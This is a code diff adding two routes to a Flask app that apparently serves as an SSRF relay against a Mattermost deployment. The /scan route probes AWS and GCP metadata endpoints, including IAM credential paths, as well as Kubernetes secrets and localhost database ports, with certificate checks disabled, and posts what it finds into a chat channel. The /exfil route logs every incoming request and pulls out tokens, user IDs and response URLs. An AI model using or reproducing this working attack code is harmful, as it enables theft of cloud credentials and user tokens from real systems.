@@ -128,5 +128,88 @@ def relay():
         "username": "SSRF-Relay-Render"
     })
 
+@app.route('/scan')
+def scan_internal():
+    """Scan internal services for SSRF escalation"""
+    targets = [
+        ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),
+        ("AWS IAM Creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+        ("AWS User Data", "http://169.254.169.254/latest/user-data"),
+        ("AWS Token", "http://169.254.169.254/latest/api/token"),
+        ("K8s API", "https://kubernetes.default.svc/api/v1/namespaces"),
+        ("K8s Secrets", "https://kubernetes.default.svc/api/v1/secrets"),
+        ("Localhost 80", "http://127.0.0.1:80/"),
+        ("Localhost 8080", "http://127.0.0.1:8080/"),
+        ("Localhost 3000", "http://127.0.0.1:3000/"),
+        ("Localhost 5432 (Postgres)", "http://127.0.0.1:5432/"),
+        ("Localhost 6379 (Redis)", "http://127.0.0.1:6379/"),
+        ("Localhost 9200 (Elastic)", "http://127.0.0.1:9200/"),
+        ("Internal DNS", "http://internal.mattermost.com/"),
+        ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/"),
+    ]
+    
+    results = []
+    for name, url in targets:
+        try:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            req = urllib.request.Request(url, headers={'User-Agent': 'SSRF-Scanner/1.0', 'Metadata-Flavor': 'Google'})
+            resp = urllib.request.urlopen(req, timeout=3, context=ctx)
+            data = resp.read().decode('utf-8', errors='replace')[:500]
+            results.append({"target": name, "url": url, "status": "ACCESSIBLE", "data": data})
+        except urllib.error.HTTPError as e:
+            results.append({"target": name, "url": url, "status": f"HTTP_{e.code}", "data": str(e.reason)})
+        except Exception as e:
+            results.append({"target": name, "url": url, "status": "BLOCKED", "data": str(e)[:100]})
+    
+    return jsonify({
+        "response_type": "in_channel",
+        "text": f"🔴 **INTERNAL SCAN RESULTS**\n\n" + "\n".join([f"• **{r['target']}**: {r['status']}" for r in results]),
+        "full_results": results,
+        "username": "SSRF-Scanner"
+    })
+
+@app.route('/exfil', methods=['GET', 'POST'])
+def exfil():
+    """Capture ALL request data including leaked tokens"""
+    timestamp = datetime.utcnow().isoformat() + "Z"
+    
+    # Capture both GET args and POST form data
+    args = dict(request.args)
+    form = dict(request.form)
+    
+    # Merge for easier checking, preferring POST data if duplicate
+    all_data = {**args, **form}
+
+    full_data = {
+        "timestamp": timestamp,
+        "headers": dict(request.headers),
+        "args": args,
+        "form": form,
+        "url": request.url,
+        "method": request.method,
+        "remote_addr": request.remote_addr
+    }
+    request_log.append(full_data)
+    
+    # Keep only last 100 entries
+    while len(request_log) > 100:
+        request_log.pop(0)
+    
+    # Format leaked tokens
+    sensitive = []
+    if 'token' in all_data: sensitive.append(f"🔐 Token: `{all_data['token']}`")
+    if 'response_url' in all_data: sensitive.append(f"🔗 Response URL: `{all_data['response_url']}`")
+    if 'user_id' in all_data: sensitive.append(f"👤 User ID: `{all_data['user_id']}`")
+    if 'trigger_id' in all_data: sensitive.append(f"🎯 Trigger ID: `{all_data['trigger_id'][:50]}...`")
+    
+    return jsonify({
+        "response_type": "in_channel", 
+        "text": f"🚨 **SENSITIVE DATA CAPTURED**\n\n" + "\n".join(sensitive) if sensitive else "No sensitive params",
+        "full_data": full_data,
+        "username": "Data-Exfil"
+    })
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8888)
